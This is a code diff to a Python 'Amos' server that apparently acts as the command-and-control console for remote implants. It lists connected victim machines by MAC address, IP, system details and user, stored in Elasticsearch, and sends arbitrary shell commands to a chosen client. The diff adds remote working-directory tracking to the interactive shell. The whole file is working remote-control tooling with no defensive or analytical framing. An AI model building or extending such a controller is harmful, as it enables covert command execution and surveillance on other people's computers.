@@ -1,9 +1,8 @@
 import time
-import sys
 import threading
 from termcolor import colored
 from http.server import ThreadingHTTPServer
-from HttpHandler import MyHandler
+import HttpHandler
 from server_settings import (
     SERVER_IP, SERVER_PORT, ES_HANDLER,
     CONNECTED_CLIENTS, client_lock,
@@ -24,25 +23,26 @@ art = """
 
 class AmosServer:
     def __init__(self):
-        self.server = ThreadingHTTPServer((SERVER_IP, SERVER_PORT), MyHandler)
+        self.server = ThreadingHTTPServer((SERVER_IP, SERVER_PORT), HttpHandler.MyHandler)
         self.running = True
         self.http_thread = None
+        self.client_cwd = None
 
 
+    # Start the HTTP server in a background daemon thread.
     def start_background_server(self):
-        """Start the HTTP server in a background daemon thread."""
         self.http_thread = threading.Thread(target=self.server.serve_forever, daemon=True)
         self.http_thread.start()
         print(f"[*] HTTP server started on {SERVER_IP}:{SERVER_PORT} (background)")
-
+ 
 
     @staticmethod
     def convert_text(text):
         return colored(text, "cyan", attrs=["bold"])
 
 
+    # Main Interactive shell
     def shell_interface(self):
-        """Main interactive shell."""
         print("[*] Amos Shell started. Type 'guide' for commands.\n")
         self.show_commands()
 
@@ -51,8 +51,6 @@ class AmosServer:
                 cmd = input(self.convert_text("AMOS: ")).strip()
                 if not cmd:
                     continue
-
-                # Parse command
                 parts = cmd.split()
                 base_cmd = parts[0].lower()
 
@@ -60,9 +58,7 @@ class AmosServer:
                     self.show_commands()
 
                 elif base_cmd == "clients":
-                    # Show all clients from Elasticsearch index
                     ES_HANDLER.retrieve_client_information()
-
 
                 elif base_cmd == "connected":
                     now = time.time()
@@ -80,12 +76,9 @@ class AmosServer:
                             # Get the full client document from ES
                             client_data = ES_HANDLER.get_client_data(cid)
                             if client_data:
-                                # Add last_seen to the source
                                 client_data['_source']['last_seen'] = time.ctime(info['last_seen'])
                                 connected_list.append(client_data)
                     if connected_list:
-                        # Use EsHandler to tabulate with the extra field
-                        # Temporarily modify field_names to include last_seen
                         ES_HANDLER.pt.field_names = ["Client ID", "Mac Address", "IP", "System", "Node Name",
                                                      "Release", "Version", "Machine", "Date-Joined",
                                                      "Time-Joined", "User", "Last Seen"]
@@ -171,17 +164,38 @@ class AmosServer:
                 print(f"[-] Error: {e}")
 
 
+    # Request current working directory from the client
+    def get_client_cwd(self, client_id, timeout=COMMAND_RESPONSE_TIMEOUT):
+        cmd_id = get_next_cmd_id()
+        command_queue.put((client_id, "cd", cmd_id))
+        print("[*] Fetching current working directory...")
+        start = time.time()
+        while time.time() - start < timeout:
+            with response_lock:
+                if cmd_id in response_storage:
+                    return response_storage.pop(cmd_id).strip()
+            time.sleep(0.2)
+        return None
+
+
+    # Interactive shell session with a selected client
     def interactive_shell(self, client_id):
-        """Interactive shell session with a specific client."""
         print(f"[+] Entering interactive shell with {client_id}. Type 'exit' to return.")
+        self.client_cwd = HttpHandler.CWD or self.get_client_cwd(client_id) or "~"
+
         while self.running:
             try:
-                cmd = input(f"{self.convert_text(client_id)}: ").strip()
+                cmd = input(f"{self.convert_text(client_id)}~[{HttpHandler.CWD}]: ").strip()
                 if not cmd:
                     continue
+
                 if cmd.lower() == "exit":
                     print("[+] Exiting interactive shell.")
                     break
+
+                elif cmd.lower() == "guide":
+                    self.show_commands()
+                    continue
 
                 # Generate command ID
                 cmd_id = get_next_cmd_id()
@@ -200,7 +214,10 @@ class AmosServer:
                     time.sleep(0.2)  # small sleep to avoid busy-wait
 
                 if response is not None:
+                    if '&cwd=' in response:
+                        response = response.split('&cwd=')[0]
                     print(f"[+] Response:\n{response}")
+
                 else:
                     print(f"[-] Timeout waiting for response (ID: {cmd_id}).")
 
@@ -235,3 +252,6 @@ if __name__ == "__main__":
     server.start_background_server()
     server.shell_interface()
     print("[+] Amos server terminated.")
+
+
+
